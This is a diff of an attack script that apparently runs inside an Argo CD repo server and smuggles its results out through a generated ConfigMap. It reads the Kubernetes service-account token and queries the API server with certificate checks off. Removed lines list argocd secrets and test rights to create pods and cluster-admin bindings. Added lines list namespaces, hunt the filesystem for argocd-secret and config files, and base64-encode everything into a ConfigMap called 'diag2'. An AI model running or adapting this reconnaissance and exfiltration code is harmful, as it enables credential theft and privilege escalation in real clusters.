@@ -3,78 +3,50 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
 
 RECON=$( (
-  echo "===SECRETS_LIST==="
+  echo "===PERL_TEST==="
+  perl -e 'print "PERL_OK\n";' 2>&1
+  
+  echo "===SSL_MODULE==="
+  perl -MIO::Socket::SSL -e 'print "SSL_OK\n";' 2>&1
+  
+  echo "===PERL_K8S==="
   perl -MIO::Socket::SSL -e '
 my $token = shift;
 my $host = shift;
 my ($h,$p) = split(/:/, $host);
-my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die "connect: $!";
-print $sock "GET /api/v1/namespaces/argocd/secrets HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
-my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
-my ($b) = $r =~ /\r\n\r\n(.*)/s;
-print substr($b, 0, 4000);
-' "$TOKEN" "$APISERVER" 2>/dev/null
-
-  echo ""
-  echo "===SELFSSAR_LIST_SECRETS==="
-  perl -MIO::Socket::SSL -e '
-my $token = shift;
-my $host = shift;
-my ($h,$p) = split(/:/, $host);
-my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"argocd","verb":"list","resource":"secrets"}}}|;
-my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
-print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
-my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
-my ($b) = $r =~ /\r\n\r\n(.*)/s;
-print substr($b,0,3000);
-' "$TOKEN" "$APISERVER" 2>/dev/null
-
-  echo ""
-  echo "===SELFSSAR_CREATE_POD==="
-  perl -MIO::Socket::SSL -e '
-my $token = shift;
-my $host = shift;
-my ($h,$p) = split(/:/, $host);
-my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"argocd","verb":"create","resource":"pods"}}}|;
-my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
-print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
-my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
-my ($b) = $r =~ /\r\n\r\n(.*)/s;
-print substr($b,0,3000);
-' "$TOKEN" "$APISERVER" 2>/dev/null
-
-  echo ""
-  echo "===SELFSSAR_CLUSTERADMIN==="
-  perl -MIO::Socket::SSL -e '
-my $token = shift;
-my $host = shift;
-my ($h,$p) = split(/:/, $host);
-my $body = q|{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"create","resource":"clusterrolebindings","group":"rbac.authorization.k8s.io"}}}|;
-my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
-print $sock "POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: " . length($body) . "\r\nConnection: close\r\n\r\n$body";
-my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
-my ($b) = $r =~ /\r\n\r\n(.*)/s;
-print substr($b,0,3000);
-' "$TOKEN" "$APISERVER" 2>/dev/null
-
-  echo ""
-  echo "===TRY_LIST_NAMESPACES==="
-  perl -MIO::Socket::SSL -e '
-my $token = shift;
-my $host = shift;
-my ($h,$p) = split(/:/, $host);
-my $sock = IO::Socket::SSL->new(PeerHost=>$h,PeerPort=>$p,SSL_verify_mode=>0) or die;
+print "HOST=$h PORT=$p\n";
+my $sock = IO::Socket::SSL->new(
+    PeerHost => $h,
+    PeerPort => $p,
+    SSL_verify_mode => 0,
+    Timeout => 10
+) or die "Connect failed: $!";
+print "Connected!\n";
 print $sock "GET /api/v1/namespaces HTTP/1.1\r\nHost: $host\r\nAuthorization: Bearer $token\r\nConnection: close\r\n\r\n";
-my $r = ""; while (<$sock>) { $r .= $_; } close $sock;
-my ($b) = $r =~ /\r\n\r\n(.*)/s;
-print substr($b, 0, 2000);
-' "$TOKEN" "$APISERVER" 2>/dev/null
+my $r = "";
+while (<$sock>) { $r .= $_; }
+close $sock;
+my ($body) = $r =~ /\r\n\r\n(.*)/s;
+print "Response length: " . length($body) . "\n";
+print substr($body, 0, 2000);
+' "$TOKEN" "$APISERVER" 2>&1
+
+  echo ""
+  echo "===ARGOCD_SECRET_FILE==="
+  find / -name "argocd-secret" -type f 2>&1 | head -5
+  find / -path "/proc" -prune -o -path "/sys" -prune -o -name "argocd-secret*" -print 2>&1 | head -5
+  
+  echo "===MOUNTED_SECRETS==="
+  ls -la /app/config/ 2>&1
+  
+  echo "===ARGOCD_REPO_SERVER_CONFIG==="
+  find / -path "/proc" -prune -o -path "/sys" -prune -o \( -name "*.yaml" -o -name "*.yml" -o -name "*.json" -o -name "*.conf" \) -type f -print 2>&1 | head -30
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: k8sapi
+  name: diag2
 data:
   result: $RECON
 EOF
